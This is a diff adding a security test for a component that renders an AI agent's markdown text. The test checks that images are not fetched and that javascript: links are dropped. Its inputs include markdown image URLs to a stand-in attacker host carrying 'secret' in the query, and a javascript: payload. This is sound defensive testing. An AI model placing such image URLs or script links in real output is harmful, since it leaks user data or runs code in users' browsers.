@@ -80,4 +80,35 @@ describe("MarkdownText", () => {
     }
     expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
   });
+
+  it("an image is never fetched: its alt text, and a link only for an http(s) URL", async () => {
+    const log = await renderAgentText(
+      [
+        "![the diagram](https://evil.example/p.png?d=secret)",
+        "![](https://evil.example/q.png)",
+        "![bad](javascript:window.__pwned=5)",
+        "[![nested](https://evil.example/r.png)](https://example.com/page)",
+      ].join("\n\n"),
+    );
+    expect(log.querySelector("img, picture, source, image")).toBeNull();
+    expect(document.querySelector('link[rel="preload"], link[rel="prefetch"]')).toBeNull();
+    const link = [...log.querySelectorAll("a")].find((a) => a.textContent?.includes("the diagram"));
+    expect(link?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
+    expect(link?.getAttribute("target")).toBe("_blank");
+    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    // no alt text: it is still said to be an image
+    expect(log.textContent).toContain("image");
+    // a script URL is no link
+    for (const a of log.querySelectorAll("a")) {
+      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
+    }
+    expect(log.textContent).toContain("bad");
+    // an image inside a link is its text, inside the one link
+    const page = [...log.querySelectorAll("a")].find(
+      (a) => a.getAttribute("href") === "https://example.com/page",
+    );
+    expect(page?.textContent).toContain("nested");
+    expect(page?.querySelector("a")).toBeNull();
+    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
+  });
 });
